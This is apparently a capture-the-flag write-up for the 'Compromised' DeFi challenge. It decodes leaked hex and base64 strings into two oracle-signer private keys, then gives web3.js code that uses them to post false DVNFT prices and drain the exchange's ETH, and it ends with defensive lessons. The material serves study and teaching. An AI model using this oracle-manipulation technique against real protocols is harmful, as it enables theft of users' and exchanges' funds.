# Challenge #7: Compromised

This time the goal is to hack an exchange that is selling (absurdly overpriced) collectibles called DVNFT (non fungible token) and steal all ETH. 

The exchange gets the price of DVNFT using an on-chain oracle which is controlled by three different trusted sources (the price is the median of the sources' prices). 

Here is the code for price calculation (in the oracle contract):

```
function _computeMedianPrice(string memory symbol) private view returns (uint256) {
    uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));

    // calculate median price
    if (prices.length % 2 == 0) {
        uint256 leftPrice = prices[(prices.length / 2) - 1];
        uint256 rightPrice = prices[prices.length / 2];
        return (leftPrice + rightPrice) / 2;
    } else {
        return prices[prices.length / 2];
    }
}
```

The only way to update the price is to call the following *postPrice* function, but it is callable only by the trusted source:

```
function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource {
    _setPrice(msg.sender, symbol, newPrice);
}

function _setPrice(address source, string memory symbol, uint256 newPrice) private {
    uint256 oldPrice = pricesBySource[source][symbol];
    pricesBySource[source][symbol] = newPrice;
    emit UpdatedPrice(source, symbol, oldPrice, newPrice);
}
```

However, what is also given is a *strange* response from one of the web services with the following data:
```
4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

Things to notice:
1. The DVNFT price can be manipulated by the oracle contract.
2. Only the trusted sources can post new price in the oracle and thus manipulate it... but they are trusted.
3. The price is calculated as the median value of three prices from three different sources therefore we would have to impersonate at least two sources.
4. The format of leaked data (2 items!) is very similar and well-known. Can you recognize it?

## Exploit

Let's start with the leaked data. When you look closer you will see that all these bytes (2 * 88 bytes) are hexadecimals for printable ASCII characters - there are between 0x20 and 0x7e (hexadecimal).

Let's decode them:
```
>>> print('4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35'.replace(' ', '').decode('hex'))
MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5

>>> print('4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'.replace(' ', '').decode('hex'))
MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
```

Ok, next encoding - this time BASE64.
```
>>> import base64
>>> print(base64.b64decode('MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5'))
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9

>>> print(base64.b64decode('MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4'))
0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

This time we got two numbers in hexadecimal format, both 32 bytes long. What is 32 bytes long that I could be interested in? Private keys! And I have two - enough to manipulate the price of DVNFT token.

Now, the scenario of the attack is following:
1. Impersonating the two trusted sources (using leaked keys) and set the prices of DVNFT to 1 ETH.
2. Buying one DVNFT token for 1 ETH from the attacker account. The exchange will get the median price which is controlled by the attacker and is now 1 ETH.
3. Again impersonating the two trusted sources (using leaked keys) and set the prices of DVNFT to 10001 ETH - the total balance of the exchange.
4. Selling one DVNFT token 10001 ETH from the attacker account. The exchange will transfer all its ETH to the attacker.

This attack does not need any smart contract to exploit. The main problem here are the leaked private keys because they allow to impersonate the **trusted** sources.

Knowing the private key of the Ethereum account one can easily send a transaction on its behalf using the following code:

```
 let source1PrivKeyString = 'c678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';

/* Set small price */
let data = web3.eth.abi.encodeFunctionCall({
    name: 'postPrice',
    type: 'function',
    inputs: [{
        type: 'string',
        name: 'symbol'
    },{
        type: 'uint256',
        name: 'newPrice'
    }]
}, ["DVNFT", ether('1').toString()]);

let tx = {
    to: this.oracle.address,
    gas: 3e6,
    nonce: 0,
    data: data 
}

web3.eth.accounts.signTransaction(tx,source1PrivKeyString).then(signed=> {
    web3.eth.sendSignedTransaction(signed.rawTransaction);
});    
```

## Lesson learned

The most important lesson here is to be careful who you trust because in this case the trusted sources had the full control over the price and the exchange had no way to mitigate that risk.

It is important to monitor the prices and have a possibility to pause the oracle functions and fallback to the previous price in case any attack is detected. 

Also there should be thresholds defined that would block the big price changes, e.g. the one in the attack from 999 ETH to 1 ETH, and the sources should have additional limitations, e.g. one price update per day.

[<< Back to the README](../README.md)